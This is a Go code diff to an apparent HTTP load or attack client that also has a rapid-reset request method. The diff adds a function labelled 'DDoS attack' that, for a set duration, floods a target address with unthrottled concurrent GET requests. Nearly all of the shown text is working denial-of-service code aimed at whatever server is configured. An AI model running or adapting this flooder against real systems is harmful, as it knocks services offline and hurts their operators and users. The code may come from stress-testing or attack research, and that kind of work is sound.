@@ -135,6 +135,60 @@ func (client *Client) RapidResetRequests(
 	return nil
 }
 
+// Perform traditional DDoS attack specifying:
+//
+// - frequency: number of rapid-reset requests per second
+//
+// - duration: length of attack
+func (client *Client) DDoSRequests(
+	frequency uint,
+	duration time.Duration,
+) error {
+	var ev, ch = terminal.NewEvent("DDoS attack")
+	go ev.Start()
+	defer terminal.StopEvent(ch)
+
+	// var loopCounter = NewLoopCounter(5)
+
+	var startTime time.Time = time.Now()
+
+	// ticks every period: 1 / frequency
+	// numNanoSeconds := 1_000_000_000 / frequency
+	// var ticker time.Ticker = *time.NewTicker(time.Duration(numNanoSeconds))
+	// var resetDelay time.Duration = time.Duration(time.Millisecond)
+
+	req, err := http.NewRequest("GET", client.targetAddress, nil)
+	if err != nil {
+		return err
+	}
+
+	for time.Since(startTime) < duration {
+
+		go func() {
+			res, err := http.DefaultClient.Do(req)
+			if err != nil {
+				return
+			}
+			code := res.StatusCode
+
+			_ = code
+
+			// upd8
+
+		}()
+
+		ch <- uint(1)
+		// // measure the latency here
+		// // set the new delay to half of the measured latency
+		// loopCounter.Next()
+		// if loopCounter.Curr == 0 {
+		// 	go client.updateRequestLatency(&resetDelay)
+		// }
+	}
+
+	return nil
+}
+
 // Perform a simple request
 func (client *Client) request(
 	req *http.Request,
